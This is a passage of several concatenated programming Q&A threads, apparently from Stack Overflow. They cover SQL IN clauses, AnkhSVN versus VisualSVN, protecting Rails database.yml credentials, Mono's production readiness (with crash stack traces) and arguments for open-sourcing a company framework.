<pre><code>select * from TABLE where field = 1 || 2 || 3
</code></pre>

<p>Any help is appreciated.</p>
 <p>Sure thing, the simplest way is this:</p>

<pre><code>select foo from bar where baz in (1,2,3)
</code></pre>
 <pre><code>select * from TABLE where field IN (1,2,3)
</code></pre>

<p>You can also conveniently combine this with a subquery that only returns one field:</p>

<pre><code>    select * from TABLE where field IN (SELECT boom FROM anotherTable)
</code></pre>
 <p>select * from TABLE where field in (1, 2, 3)</p>
 <pre><code>WHERE field IN (1, 2, 3)
</code></pre>
 <p>OR:</p>

<pre><code>SELECT foo FROM bar WHERE baz BETWEEN 1 AND 3
</code></pre>
 <p>You can still use in for</p>

<pre><code>select *
from table
where field  = '1' or field = '2' or field = '3'
</code></pre>

<p>its just</p>

<pre><code>select * from table where field in ('1','2','3')
</code></pre>
"
"Is AnkhSVN any good? <p>I asked a couple of coworkers about <a href=""http://ankhsvn.open.collab.net"" rel=""nofollow"">AnkhSVN</a> and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.</p>

<p>What's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.</p>
 <p>Older AnkhSVN (pre 2.0) was very crappy and I was only using it for shiny icons in the solution explorer. I relied on Tortoise for everything except reverts.</p>

<p>The newer Ankh is a complete rewrite (it is now using the Source Control API of the IDE) and looks &amp; works much better. Still, I haven't forced it to any heavy lifting. Icons is enough for me.</p>

<p>The only gripe I have with 2.0 is the fact that it slaps its footprint to <strong>.sln</strong> files. I always revert them lest they cause problems for co-workers who do not have Ankh installed. Dunno if my fears are groundless or not.</p>

<p><hr /></p>

<p>addendum:</p>

<p>I have been using v2.1.7141 a bit more extensively for the last few weeks and here are the new things I have to add:</p>

<ul>
<li>No ugly crashes that plagued v1.x. Yay!</li>
<li>For some reason, ""Show Changes"" (diff) windows are limited to only two. Meh.</li>
<li>Diff windows do not allow editing/reverting yet. Boo!</li>
<li>Updates, commits and browsing are MUCH faster than Tortoise. Yay!</li>
</ul>

<p>All in all, I would not use it standalone, but once you start using it, it becomes an almost indispensable companion to Tortoise.</p>
 <p>I tried version 1, and it was unreliable to say the least. I can't say anything about 2.0.</p>

<p>If you can afford it, the one I use, <a href=""http://www.visualsvn.com/"" rel=""nofollow"">VisualSVN</a>, is very good and uses TortoiseSVN for all its gui, except for the specialized things related to its VS integration.</p>
 <p>I always had stability issues with AnkhSVN. I couldn't switch everyone to Subversion where I work without an integrated solution.</p>

<p>Thank goodness for <a href=""http://www.visualsvn.com/"" rel=""nofollow"">VisualSVN</a> + <a href=""http://tortoisesvn.tigris.org/"" rel=""nofollow"">TortoiseSVN</a>.</p>

<p>VisualSVN isn't free, but it is cheap, and works a treat. </p>
 <p>I tried AnkhSVN (1.0.3, just 4 months ago), and it did not work the way I wanted it to (i.e. needed to select things in the browser window instead of based on active file). I ended up making some macros that utilize TortoiseSVN that work much more like what I expected.</p>

<p>I've been very happy with using TortoiseSVN via explorer and my macros inside the IDE.</p>
 <p>I started with AnkhSvn and then moved on to VisualSvn. I have my own gripes with VisualSvn but its far less trouble compared to Ankh. I'm yet to try the new version of Ankh which they say is a complete rewrite and had inputs from Microsoft dev team as well.</p>
 <p>I've been using both the newest version of Ankh SVN and Tortoise on a project at home. I find them to both be very good with a caveat.</p>

<p>I've found that both SVN tools have at times failed to keep up with my file/folder renaming and moving resulting in it thinking that a perfectly good file needs to be deleted on the next commit. This is probably down to me misusing SVN in some way but TFS at work does not have this problem.</p>
 <p>@<a href=""#18127"" rel=""nofollow"">mcintyre321</a></p>

<blockquote>
  <p>I've found that both SVN tools have at times failed to keep up with my file/folder renaming and moving resulting in it thinking that a perfectly good file needs to be deleted on the next commit.</p>
</blockquote>

<p>A move or rename operation results in an delete and 'add with history' at subversion level.</p>

<p>TortoiseSvn shows this as:</p>

<pre><code>originalFile   deleted
newFile        added (+)
</code></pre>
 <p>Earlier on (like 2 years ago when I last tried), AnkhSVN and Tortoise used in parallel with the same working copy caused some kind of working copy corruption where Ankh and Tortoise somehow lost track of the state the other tool left the working copy in.</p>

<p>It was as if one of the tools stored additional metadata not contained in the working copy and was reliant on that being correct.</p>

<p>The problems showed themselves by Ankh (or Tortoise) insisting on files being there which weren't, on files being changed which weren't and on files not being changed which were (and thus unable to commit).</p>

<p>Maybe this has been fixed since, but I thought I'd better warn you guys.</p>
 <p>About a year ago me and a buddy used AnkhSVN for a project... several commits later while moving namespaces around, it broke the SVN repository. Broke as in, the last commit we did got corrupted, and we couldn't commit anymore.</p>

<p>After that we used <a href=""http://tortoisesvn.tigris.org/"" rel=""nofollow"">TortoiseSVN</a> and did the namespace moving manually, it just... <em>worked</em>. If you're only working on base class libraries you could always try using <a href=""http://www.icsharpcode.net/OpenSource/SD/"" rel=""nofollow"">SharpDevelop</a> instead (that integrates with TortoiseSVN).</p>

<p>I do hope they did fix AnkhSVN now though because IDE integrations always rock... when they work.</p>
 <p>I had no problems with v1, but I was warned not to use it. I've been using v2 for a while, and I've had no problems with it. I still keep a backup of the repository though...</p>
 <p>@<a href=""#58530"">pilif</a>: AnkhSVN maintains an in-memory state of the working copy, which is invalidated/updated by Visual Studio events (ie you edit/change a file) and AnkhSVN events (ie you commit/update/revert/etc)</p>

<p>Whenever the working copy is changed from outside Visual Studio (by editing with another tool, or by using another Subversion client), you will have to refresh AnkhSvn using the Refresh command we provide.</p>

<p>The other thing that happens when you delete a file in a project with TortoiseSvn for example, is that it remains listed in the project file, and you will have to remove it there seperately (and then commit the project file as well).</p>
 <p>Copy/Pasting parts of my <a href=""http://www.stum.de/2008/09/06/visualsvn/"" rel=""nofollow"">own Blogpost</a>, as I switched from Ankh to VisualSVN:</p>

<blockquote>
  <p>Why did I switch? Because i was a bit unhappy with the overall stability of Ankh, since it has some problems actually tracking Solution changes. VisualSVN is “just” a TortoiseSVN Frontend, which means it leaves all the “heavy lifting” to a third-party tool that a) is installed on most Workstations anyway and b) that’s been tested and used by such a wide audience, it’s really rock-solid.</p>
  
  <p>Now, AnkhSVN is certainly not a bad product, and the people behind it are serious about what they are doing, but having long-deleted files still in my SVN or getting the “Please Cleanup your solution” message get’s annoying after some time, but my biggest gripe is the property window. It’s nice that there is a nice window with Radio Buttons asking me which property I want to add. Unfortunately, there is no way to manually enter a property.</p>
</blockquote>

<p><strong>Edit:</strong> That was for AnkhSVN 1.x. In the meantime, it was updated to 2.x and <em>much</em> improved. I use it in production on a system where I don't have VisualSVN and it works extremely well now.</p>
"
"How Do You Secure database.yml? <p>Within Ruby on Rails applications database.yml is a plain text file that stores database credentials.</p>

<p>When I deploy my Rails applications I have an after deploy callback in my Capistrano 
recipe that creates a symbolic link within the application's /config directory to the database.yml file. The file itself is stored in a separate directory that's outside the standard Capistrano /releases directory structure. I chmod 400 the file so it's only readable by the user who created it.</p>

<ul>
<li>Is this sufficient to lock it down? If not, what else do you do?</li>
<li>Is anyone encrypting their database.yml files?</li>
</ul>
 <p>You'll also want to make sure that your SSH system is well secured to prevent people from logging in <em>as</em> your Capistrano bot.  I'd suggest restricting access to password-protected key pairs.</p>

<p>Encrypting the .yml file on the server is useless since you have to give the bot the key, which would be stored . . . on the same server.  Encrypting it on your machine is probably a good idea.  Capistrano can decrypt it before sending.</p>
 <p>If you're very concerned about security of the yml file, I have to ask: Is it stored in your version control?  If so, that's another point where an attacker can get at it.  If you're doing checkout/checkin over non-SSL, someone could intercept it.</p>

<p>Also, with some version control (svn, for exampl), even if you remove it, it's still there in the history.  So, even if you removed it at some point in the past, it's still a good idea to change the passwords.</p>
 <p>Even if you secure the database.yml file, people can still write that uses the same credentials if they can change the code of your application.</p>

<p>An other way to look at this is: does the web application have to much access to the database. If true lower the permissions. Give just enough permissions to the application. This way an attacker can only do what the web application would be able to do.</p>
 <p>The way I have tackled this is to put the database password in a file with read permissions only for the user I run my application as.  Then, in database.yml I use ERB to read the file:</p>

<pre><code>production:
  adapter: mysql
  database: my_db
  username: db_user
  password: &lt;%= begin IO.read(""/home/my_deploy_user/.db"") rescue """" end %&gt;
</code></pre>

<p>Works a treat.</p>
 <p>Take a look at this github solution: <a href=""https://github.com/NUBIC/bcdatabase"">https://github.com/NUBIC/bcdatabase</a>. bcdatabase provides an encrypted store where the passwords can be kept separated from the yaml files.</p>

<blockquote>
  <p>bcdatabase</p>
  
  <p>bcdatabase is a library and utility
  which provides database configuration
  parameter management for Ruby on Rails
  applications. It provides a simple
  mechanism for separating database
  configuration attributes from
  application source code so that
  there's no temptation to check
  passwords into the version control
  system. And it centralizes the
  parameters for a single server so that
  they can be easily shared among
  multiple applications and easily
  updated by a single administrator.</p>
</blockquote>
"
"Is Mono ready for prime time? <p>Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, <em>really</em> compatible enough to just take of and run already written code for Microsoft's runtime?</p>
 <p>In many cases, you can take existing code and just run it on Mono, particularly if you're porting an ASP.NET application.</p>

<p>In some cases, you may require whole new sections of code to make it work. If you use System.Windows.Forms, for example, the application won't work unmodified. Likewise if you use any Windows-specific code (registry access code, for example). But I think the worst offender is UI code. That's particularly bad on Macintosh systems.</p>
 <p>On the desktop side, Mono works great if you commit to using GTK#. The Windows.Forms implementation is still a little buggy (for example, TrayIcon's don't work) but it has come a long way. Besides, GTK# is a better toolkit than Windows Forms as it is.</p>

<p>On the web side, Mono has implemented enough of ASP.NET to run most sites perfectly. The difficulty here is finding a host that has mod_mono installed on apache, or doing it yourself if you have shell access to your host.</p>

<p>Either way, Mono is great, and stable. </p>

<p>Key things to remember when creating a cross platform program:</p>

<ul>
<li>Use GTK# instead of Windows.Forms</li>
<li>Ensure to properly case your filenames</li>
<li>Use <code>Path.Separator</code> instead of hardcoding <code>""\""</code>, also use <code>Environment.NewLine</code> instead of <code>""\n""</code>.</li>
<li>Do not use any P/Invoked calls to Win32 API.</li>
<li>Do not use the Windows Registry.</li>
</ul>
 <p>It has pretty extensive coverage up to .NET 4.0 and even include some features from .NET 4.5 APIs, but there are a few areas that we have chosen not to implement due to the APIs being deprecated, new alternatives being created or the scope being too large.   The following APIs are not available in Mono:</p>

<ul>
<li>Windows Presentation Foundation</li>
<li>Windows Workflow Foundation (neither of the two versions)</li>
<li>Entity Framework</li>
<li>The WSE1/WSE2 ""add-ons"" to the standard Web Services stack</li>
</ul>

<p>Additionally, our WCF implementation is limited to what Silverlight supported.</p>

<p>The easiest way to check for your specific project is to run the <a href=""http://www.mono-project.com/MoMA"">Mono Migration Analyzer (MoMA)</a>. The benefit is that it will notify the Mono team of issues which will prevent you from using Mono (if any), which lets them prioritize their work.</p>

<p>I recently ran MoMA on SubSonic and found only one issue - a weird use of Nullable types. That's a big codebase, so the coverage there was pretty impressive.</p>

<p>Mono is in active use in <a href=""http://www.mono-project.com/Software"">several commercial as well as open source products</a>. It's in use in some large applications, such as <a href=""http://www.mono-project.com/Companies_Using_Mono"">Wikipedia and the Mozilla Developer Center</a>, and has been used in embedded applications such as the Sansa MP3 players and powers thousands of published games.</p>

<p>At the language level, <a href=""http://www.mono-project.com/Release_Notes_Mono_2.12"">the Mono compiler is fully compliant with the C# 5.0 language specification</a>.</p>
 <p>It really depends on the namespaces and classes that you are using from the .NET framework.  I had interest in converting one of my windows services to run on my email server, which is Suse, but we ran into several hard roadblocks with APIs that had not been completely implemented.  There is a chart somewhere on the Mono website that lists all of the classes and their level of completion.  If your application is covered, then go for it.</p>

<p>Like any other application, do prototyping and testing before you make a full commitment, of course.</p>

<p>Another problem we ran into is licensed software: if you are referencing someone else's DLL, you can't code your way around incompatibilities that are buried in that assembly.</p>
 <blockquote>
  <p>Do you know how good Mono 2.0 preview's support is for Windows Forms 2.0?</p>
</blockquote>

<p>From the little bit that I've played with it, it seemed relatively complete and almost usable.  It just didn't quite look right in some places and is still a little hit or miss overall.  It amazed me that it worked as well as it did with some of our forms, though honestly.</p>
 <p>I would imagine then if you have an application with some 3rd party components you may be stuffed.  I doubt a lot of vendors will develop with Mono in mind</p>

<p>Example: <a href=""http://community.devexpress.com/forums/p/55085/185853.aspx"" rel=""nofollow"">http://community.devexpress.com/forums/p/55085/185853.aspx</a></p>
 <p>We've been using it for a project here at work that needed to run on Linux but reuse some .NET libraries that we built in Managed C++.  I've been very surprised at how well it has worked out.  Our main executable is being written in C# and we can just reference our Managed C++ binaries with no issue.  The only difference in the C# code between Windows and Linux is RS232 serial port code.</p>

<p>The only big issue I can think of happened about a month ago.  The Linux build had a memory leak that wasn't seen on the Windows build.  After doing some manual debugging (the basic profilers for Mono on Linux didn't help much), we were able to narrow the issue down to a specific chunk of code.  We ended up patching a workaround, but I still need to find some time to go back and figure out what the root cause of the leak was.</p>
 <p>MoMA is a great tool for this, as someone else suggested.  The biggest sources of incompatibility these days are applications which DllImport (or P/Invoke) into Win32 libraries.  Some assemblies aren't implemented, but most of them are Windows-only and really wouldn't make sense on Linux.  I think it's fairly safe to say that most ASP.NET applications can run on Mono with limited modifications.</p>

<p>(Disclosure: I've contributed to Mono itself, as well as written apps that run on top of it.)</p>
 <p>The recommendations for the accepted answer are a little out of date now.</p>

<ul>
<li>The windows forms implementation is pretty good now.  (See <a href=""http://code.google.com/p/paint-mono/"">Paint-Mono</a> for a port of Paint.net which is a pretty involved Windows forms application.  All that was required was an emulation layer for some of the P-Invoke and unsupported system calls).</li>
<li>Path.Combine as well as Path.Seperator to join paths and filenames.</li>
<li>The windows Registry is OK, as long as you are only using it for storing and retrieving data from your applications (i.e. you can't get any information about Windows from it, since it is basically a registry for Mono applications).</li>
</ul>
 <p>There are a couple of scenarios to consider: (a) if you are porting an existing application and wondering if Mono is good enough for this task;   (b) you are starting to write some new code, and you want to know if Mono is mature enough.</p>

<p>For the first case, you can use the <a href=""http://mono-project.com/MoMA"">Mono Migration Analyzer tool</a> (Moma) to evaluate how far your application is from running on Mono.  If the evaluation comes back with flying colors, you should start on your testing and QA and get ready to ship.</p>

<p>If your evaluation comes back with a report highlighting features that are missing or differ significantly in their semantics in Mono you will have to evaluate whether the code can be adapted, rewritten or in the worst case whether your application can work with reduced functionality.      </p>

<p>According to our Moma statistics based on user submissions (this is from memory) about 50% of the applications work out of the box, about 25% require about a week worth of work (refactoring, adapting) another 15% require a serious commitment to redo chunks of your code, and the rest is just not worth bothering porting since they are so incredibly tied to Win32.   At that point, either you start from zero, or a business decision will drive the effort to make your code portable, but we are talking months worth of work (at least from the reports we have).</p>

<p>If you are starting from scratch, the situation is a lot simpler, because you will only be using the APIs that are present in Mono.   As long as you stay with the supported stack (which is pretty much .NET 2.0, plus all the core upgrades in 3.5 including LINQ and System.Core, plus any of the Mono cross-platform APIs) you will be fine.  </p>

<p>Every once in a while you might run into bugs in Mono or limitations, and you might have to work around them, but that is not different than any other system.</p>

<p>As for portability: ASP.NET applications are the easier ones to port, as those have little to no dependencies on Win32 and you can even use SQL server or other popular databases (there are plenty of bundled database providers with Mono).   </p>

<p>Windows.Forms porting is sometimes trickier because developers like to escape the .NET sandbox and P/Invoke their brains out to configure things as useful as the changing the cursor blinking rate expressed as two bezier points encoded in BCD form in a wParam.   Or some junk like that.</p>
 <p>If you want to use WPF you'rr out of luck Mono currently has no plans to implement it.</p>

<p><a href=""http://www.mono-project.com/WPF"">http://www.mono-project.com/WPF</a></p>
 <p>Yes it definitely is (if you're careful though)
We support Mono in Ra-Ajax (Ajax library found at <a href=""http://ra-ajax.org"" rel=""nofollow"">http://ra-ajax.org</a>) and we're mostly not having problems at all. You need to be careful with some of the ""most insane things"" from .Net like WSE etc, and also probably quite some few of your existing projects will not be 100% Mono compatible, but new projects if you test them during development will mostly be compatible without problems with Mono. And the gain from supporting Linux etc through using Mono is really cool ;)</p>

<p>A large portion of the secret of supporting Mono I think is to use the right tools from the beginning, e.g. ActiveRecord, log4net, ra-ajax etc...</p>
 <p>For the type of application we're building Mono unfortunately doesn't seem ready for production. We were impressed with it overall, and impressed with its performance both on Windows and on EC2 machines, however, our program crashed consistenly with garbage collection errors on both Windows and linux.</p>

<p>The error message is: ""fatal errors in GC: too many heap sections"", here is a link to someone else experiencing the problem in a slightly different way:</p>

<p><a href=""http://bugzilla.novell.com/show_bug.cgi?id=435906"" rel=""nofollow"">http://bugzilla.novell.com/show_bug.cgi?id=435906</a></p>

<p>The first piece of code we ran in Mono was a simple programming challenge we'd developed... The code loads about 10mb data into some data structures (e.g. HashSets), then runs 10 queries against the data. We ran the queries 100 times in order to time them and get an average. </p>

<p>The code crashed around the 55th query on Windows. On linux it worked, but as soon as we moved to a bigger data set, it would crash too.</p>

<p>This code is very simple, e.g. put some data into HashSets and then query those HashSets etc, all native c#, nothing unsafe, no API calls. On the Microsoft CLR it never crashes, and runs on huge data sets 1000s times just fine.</p>

<p>One of our guys emailed Miguel and included the code that caused the problem, no response yet. :(</p>

<p>It also seems like many other people have encountered this problem without solution - one solution has been suggested to recompile Mono with different GC settings but that just appears to increase the threshold before which it crashes. </p>
 <p>Just check www.plasticscm.com. Everything (client, server, GUI, merge tools) is written on mono.</p>
 <p>I personally use Mono in a prime-time env.
I run mono servers dealing with giga-bytes of udp/tcp data processing related tasks and couldn't be happier.</p>

<p>There are peculiarities, and one of the most annoying things is that you can't just ""build"" your msbuild files due to Mono's current state:</p>

<ul>
<li>MonoDevelop (the IDE) has some partial msbuild support, but will basically bork on any ""REAL"" build conf beyond a simple hello-world (custom build tasks, dynamic ""properties"" like $(SolutionDir), real configuration to name a few dead-ends)</li>
<li>xbuild which <em>SHOULD have been</em> the mono-supplied-msbuild-fully-compatible-build-system is even more horrible, so building from the command line is actually a worse experience than using the GUI, which is a very ""unorthodox"" state of the union for Linux environments... </li>
</ul>

<p>Once/During getting your stuff actually BUILT, you might see some wildernesses even for code that SHOULD be supported like:</p>

<ul>
<li>the compiler getting borked on certain constructs</li>
<li>and certain more advanced/new .NET classes throwing un-expected crap at you (XLinq anyone?)</li>
<li>some immature runtime ""features"" (3GB heap limit ON x64... WTF!) </li>
</ul>

<p><em>but heaving said that generally speaking things start working very quickly, and solutions/workarounds are abundant</em>.</p>

<p><strong>Once you've gone over those initial hurdles, my experience is that mono ROCKS, and keeps getting better with every iteration</strong>.</p>

<p>I've had servers running with mono, processing 300GB of data per day, with tons of p/invokes and generally speaking doing LOTS of work and staying UP for 5-6 months, even with the ""bleeding edge"" mono.</p>

<p>Hope this helps.</p>
 <p>No, mono is not ready for serious work. I wrote a few programs on Windows using F# and ran them on Mono. Those program used disk, memory and cpu quite intensively. I saw crashes in mono libraries (managed code), crashes in native code and crashes in the virtual machine. When mono worked the programs were at least two times slower than in .Net in Windows and used much more memory. Stay away from mono for serious work.</p>
 <p>Well, mono is great, but as far as I can see, it is unstable. It works, but faults when you give mono process a serious work to do. </p>

<p>TL;DR - Do not use mono if you :</p>

<ul>
<li>use AppDomains (Assembly Load\Unload) in multithreaded environments</li>
<li>Can't sustain 'let-it-fail' model</li>
<li>Experience occasional heavy-load events during process run</li>
</ul>

<p>So, the facts.</p>

<p>We use mono-2.6.7 (.net v 3.5) on RHEL5, Ubuntu, and, to my point of view, it is most stable version built by Novell. It has an issue with Unloading AppDomains (segfaults), however, it fails very rare and this, by far, is acceptable (by us). </p>

<p>Okay. But if you want to use features of .net 4.0, you have to switch to versions 2.10.x, or 3.x, and that's where problems begin.</p>

<p>Compared to 2.6.7, new versions are just unacceptable to be used. I wrote a simple stress test application to tests mono installations.</p>

<p>It is here, with instructions to use : <a href=""https://github.com/head-thrash/stress_test_mono"">https://github.com/head-thrash/stress_test_mono</a></p>

<p>It uses Thread Pool Worker Threads. Worker loads dll to AppDomain and tries to do some math-work. Some of work is many-threaded, some is single. Almost all work is CPU-bound, although there are some reads of files from disk.</p>

<p>Results are not very good. In fact, for version 3.0.12:</p>

<ul>
<li>sgen GC segfaults process almost immediatly</li>
<li>mono with boehm lives longer (from 2 to 5 hours), but segfaults eventually</li>
</ul>

<p>As mentioned above, sgen gc just does not work (mono built from source):</p>

<pre><code>* Assertion: should not be reached at sgen-scan-object.h:111

Stacktrace:


Native stacktrace:

    mono() [0x4ab0ad]
    /lib/x86_64-linux-gnu/libpthread.so.0(+0xfcb0) [0x2b61ea830cb0]
    /lib/x86_64-linux-gnu/libc.so.6(gsignal+0x35) [0x2b61eaa74425]
    /lib/x86_64-linux-gnu/libc.so.6(abort+0x17b) [0x2b61eaa77b8b]
    mono() [0x62b49d]
    mono() [0x62b5d6]
    mono() [0x5d4f84]
    mono() [0x5cb0af]
    mono() [0x5cb2cc]
    mono() [0x5cccfd]
    mono() [0x5cd944]
    mono() [0x5d12b6]
    mono(mono_gc_collect+0x28) [0x5d16f8]
    mono(mono_domain_finalize+0x7c) [0x59fb1c]
    mono() [0x596ef0]
    mono() [0x616f13]
    mono() [0x626ee0]
    /lib/x86_64-linux-gnu/libpthread.so.0(+0x7e9a) [0x2b61ea828e9a]
    /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x2b61eab31ccd]
</code></pre>

<p>As for boehm segfauls - for example (Ubuntu 13.04, mono built from source):</p>

<pre><code>mono: mini-amd64.c:492: amd64_patch: Assertion `0' failed.
Stacktrace:
at &lt;unknown&gt; &lt;0xffffffff&gt;
at System.Collections.Generic.Dictionary`2.Init (int,System.Collections.Generic.IEqualityComparer`1&lt;TKey&gt;) [0x00012] in /home/bkmz/my/mono/mcs/class/corlib/System.Collections.Generic/Dictionary.cs:264
at System.Collections.Generic.Dictionary`2..ctor () [0x00006] in /home/bkmz/my/mono/mcs/class/corlib/System.Collections.Generic/Dictionary.cs:222
at System.Security.Cryptography.CryptoConfig/CryptoHandler..ctor (System.Collections.Generic.IDictionary`2&lt;string, System.Type&gt;,System.Collections.Generic.IDictionary`2&lt;string, string&gt;) [0x00014] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/Crypto
Config.cs:582
at System.Security.Cryptography.CryptoConfig.LoadConfig (string,System.Collections.Generic.IDictionary`2&lt;string, System.Type&gt;,System.Collections.Generic.IDictionary`2&lt;string, string&gt;) [0x00013] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/CryptoCo
nfig.cs:473
at System.Security.Cryptography.CryptoConfig.Initialize () [0x00697] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/CryptoConfig.cs:457
at System.Security.Cryptography.CryptoConfig.CreateFromName (string,object[]) [0x00027] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/CryptoConfig.cs:495
at System.Security.Cryptography.CryptoConfig.CreateFromName (string) [0x00000] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/CryptoConfig.cs:484
at System.Security.Cryptography.RandomNumberGenerator.Create (string) [0x00000] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/RandomNumberGenerator.cs:59
at System.Security.Cryptography.RandomNumberGenerator.Create () [0x00000] in /home/bkmz/my/mono/mcs/class/corlib/System.Security.Cryptography/RandomNumberGenerator.cs:53
at System.Guid.NewGuid () [0x0001e] in /home/bkmz/my/mono/mcs/class/corlib/System/Guid.cs:492
</code></pre>

<p>Or (RHEL5, mono is taken from rpm here <a href=""ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home%3A/vmas%3A/mono-centos5"">ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home%3A/vmas%3A/mono-centos5</a>)</p>

<pre><code>Assertion at mini.c:3783, condition `code' not met
Stacktrace:
at &lt;unknown&gt; &lt;0xffffffff&gt;
at System.IO.StreamReader.ReadBuffer () [0x00012] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.IO/StreamReader.cs:394
at System.IO.StreamReader.Peek () [0x00006] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.IO/StreamReader.cs:429
at Mono.Xml.SmallXmlParser.Peek () [0x00000] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/Mono.Xml/SmallXmlParser.cs:271
at Mono.Xml.SmallXmlParser.Parse (System.IO.TextReader,Mono.Xml.SmallXmlParser/IContentHandler) [0x00020] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/Mono.Xml/SmallXmlParser.cs:346
at System.Security.Cryptography.CryptoConfig.LoadConfig (string,System.Collections.Generic.IDictionary`2&lt;string, System.Type&gt;,System.Collections.Generic.IDictionary`2&lt;string, string&gt;) [0x00021] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Security.Cryptog
raphy/CryptoConfig.cs:475
at System.Security.Cryptography.CryptoConfig.Initialize () [0x00697] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Security.Cryptography/CryptoConfig.cs:457
at System.Security.Cryptography.CryptoConfig.CreateFromName (string,object[]) [0x00027] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Security.Cryptography/CryptoConfig.cs:495
at System.Security.Cryptography.CryptoConfig.CreateFromName (string) [0x00000] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Security.Cryptography/CryptoConfig.cs:484
at System.Security.Cryptography.RandomNumberGenerator.Create (string) [0x00000] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Security.Cryptography/RandomNumberGenerator.cs:59
at System.Security.Cryptography.RandomNumberGenerator.Create () [0x00000] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Security.Cryptography/RandomNumberGenerator.cs:53
at System.Guid.NewGuid () [0x0001e] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System/Guid.cs:483
at System.Runtime.Remoting.RemotingServices.NewUri () [0x00020] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Runtime.Remoting/RemotingServices.cs:356
at System.Runtime.Remoting.RemotingServices.Marshal (System.MarshalByRefObject,string,System.Type) [0x000ba] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System.Runtime.Remoting/RemotingServices.cs:329
at System.AppDomain.GetMarshalledDomainObjRef () [0x00000] in /usr/src/redhat/BUILD/mono-3.0.3/mcs/class/corlib/System/AppDomain.cs:1363
</code></pre>

<p>Both failures are somehow connected to AppDomains logic, so, you should stay away from them in mono.</p>

<p>BTW, tested program worked 24 hours on Windows machine in MS .NET 4.5 env without any fail.</p>

<p>So, in conclusion, I would like to say - use mono with caution. It works from the first glance, but can easily fail whenever. You'd be left with a bunch of core dumps and major faith loss in opensource projects.</p>
"
"Arguments for going open source <p>I've spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work. In short it loads a xml with markup that defines the blocks of the site, their content and the styling of these (very similar to html), handles the loading of assets and such.</p>

<p>Now I'm rather pleased with how this is turning out, and I've been itching to release some of my code for public use (and scrutiny). I'm also reasonably sure that it fills a void for quick and easy construction of sites (or parts of them).</p>

<p><strong><em>What would be the best arguments to convince my boss/coworkers that releasing this under an open source license is a good idea?</em></strong></p>
 <ul>
<li>Popularity</li>
<li>Community contribution</li>
<li>Public scrutiny</li>
<li>We will be forced to adhere to standards. (which will in turn make the product better)</li>
<li>Goodwill</li>
</ul>
 <p>I think the crux of the reason that open source is a good idea is because you pool together a LARGE resource of people usually working for free to create something useful and exciting. A site like Digg is churning out more and better stories than the staff @ Slashdot could because the community drives it. So too, could an open source project get more done than a dedicated team IF you have a project exciting enough to draw in participation. There's also many other benefits like improving your code and learning along the way.</p>
 <p><strong>Publicity:</strong> You could exemplify with the <a href=""http://en.wikipedia.org/wiki/Ruby_on_Rails"" rel=""nofollow"">Ruby on Rails</a> framework. </p>

<p>It was created to do the <a href=""http://www.37signals.com"" rel=""nofollow"">37signals</a> web apps. They open sourced it, then someone came along and build twitter. Imagine the publicity they had from that!</p>
 <p>The OSI has a number of good resources with <a href=""http://www.opensource.org/advocacy/case_for_business.php"" rel=""nofollow"">http://www.opensource.org/advocacy/case_for_business.php</a> probably being the most relevant for you.</p>

<p>There are loads of open source projects and when popular, the best advantage in my opinion is having bug fixes and enhancements contributed back into the project. You tend to only develop the necessary features for the use case at your job (exceptions do exist of course) and it's good to have other people work on other areas of the project.</p>

<p>That said, people will usually only do that if they have a use for the project themselves and raising awareness can be just as hard as marketing a commercial project - you will probably find only a few people use it having stumbled upon the project through an obscure Google search!</p>

<p>As such, whilst there are a lot of development oriented advantages, even if there aren't many (or any) actual users, it looks very good from a business/company perspective that your organisation is supporting the release of internal projects under open source licenses. This shows good things to prospective employees about the openess of the organisation.</p>

<p>So whilst you only get the big open source advantages with scale, there are less obvious ones that start working immediately, namely building a good name for your company.</p>
 <p>The most important contribution of making a product open source is that it instantly becomes more accessible for people. </p>

<p>It also helps people who are really interested in your work to see what you have done, make suggestions on improving it and even lend you a hand in doing so sometimes. In addition, you contribute something to the vast repository of open source software and help the community grow and learn in your own small way.</p>
 <p>Benefits to your company are few. All of the reasons others have given assume a degree of popularity that is... unlikely. Most business folks are going to realize that without needing to think very hard about it so they aren't going to find advertising or leverage or public scrutiny or tool improvement enough of a reason to take the ""risk"" of releasing it as open source.</p>

<p>That said, here's the best counter to the ""risk"" argument for a company to release an internal tool as Open Source: if it isn't part of your core competency and care is taken so that it doesn't suck company resources (or expose company secrets/infrastructure), there really is no risk. The company loses nothing and gains a <em>potential</em> for gain&mdash;even if that potential is small.</p>
 <p>I've released a couple of company-time developed packages as open source. The basic pitch:</p>

<p>It is more profitable or advantageous to the company to release this:</p>

<ul>
<li>this package is not part of our core business.  We're not giving away the recipe to the secret sauce.</li>
<li>we will get a bigger body of people exercising the code, finding bugs and thereby increasing the code quality.</li>
<li>it's likely we can find some people who will contribute code for features that we might find useful.</li>
